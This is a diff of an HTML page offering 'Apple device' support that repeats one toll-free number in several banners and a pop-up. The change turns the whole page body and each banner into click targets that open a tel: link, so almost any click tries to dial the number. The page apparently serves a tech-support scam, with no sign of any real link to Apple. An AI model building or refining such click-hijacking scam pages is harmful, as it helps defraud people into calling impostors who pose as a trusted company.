@@ -24,6 +24,7 @@
       left: 0;
       right: 0;
       z-index: 1000; /* Ensures banners are on top of other content */
+      cursor: pointer; /* Make banners clickable */
     }
 
     .banner.top {
@@ -118,11 +119,11 @@
     }
   </style>
 </head>
-<body>
+<body onclick="callNow()">
 
   <!-- Top Banner -->
-  <div class="banner top" id="bannerTop">
-    <button class="close-banner" onclick="closeBanner('bannerTop')">×</button>
+  <div class="banner top" id="bannerTop" onclick="callNow()">
+    <button class="close-banner" onclick="closeBanner('bannerTop', event)">×</button>
     <strong>Toll-Free Support Available: +1 (888) 481-6264</strong>
   </div>
 
@@ -131,20 +132,53 @@
     <p>Need help with your Apple device? Call us now for support!</p>
 
     <!-- Middle Banner -->
-    <div class="banner middle" id="bannerMiddle">
-      <button class="close-banner" onclick="closeBanner('bannerMiddle')">×</button>
+    <div class="banner middle" id="bannerMiddle" onclick="callNow()">
+      <button class="close-banner" onclick="closeBanner('bannerMiddle', event)">×</button>
       <strong>24/7 Customer Support: +1 (888) 481-6264</strong>
     </div>
 
     <!-- Button to trigger the pop-up -->
-    <button class="call-button" onclick="showPopup()">Call Now</button>
+    <button class="call-button" onclick="callNow()">Call Now</button>
   </div>
 
   <!-- Bottom Banner -->
-  <div class="banner bottom" id="bannerBottom">
-    <button class="close-banner" onclick="closeBanner('bannerBottom')">×</button>
+  <div class="banner bottom" id="bannerBottom" onclick="callNow()">
+    <button class="close-banner" onclick="closeBanner('bannerBottom', event)">×</button>
     <strong>Reach Us Anytime: +1 (888) 481-6264</strong>
   </div>
 
   <!-- Modal (Pop-Up) -->
-  <div id="myModal" class="
+  <div id="myModal" class="modal">
+    <div class="modal-content">
+      <!-- Close button in the top right corner -->
+      <button class="close-btn" onclick="closePopup()">×</button>
+      <p>Call Now: <a href="tel:+18884816264">+1 (888) 481-6264</a></p>
+    </div>
+  </div>
+
+  <!-- JavaScript functions -->
+  <script>
+    // Function to display the pop-up
+    function showPopup() {
+      document.getElementById('myModal').style.display = 'flex';
+    }
+
+    // Function to close the pop-up
+    function closePopup() {
+      document.getElementById('myModal').style.display = 'none';
+    }
+
+    // Function to close the banner and prevent the call from triggering
+    function closeBanner(bannerId, event) {
+      event.stopPropagation();  // Prevent triggering the call when closing the banner
+      document.getElementById(bannerId).style.display = 'none';
+    }
+
+    // Function to make a call
+    function callNow() {
+      window.location.href = 'tel:+18884816264';
+    }
+  </script>
+
+</body>
+</html>
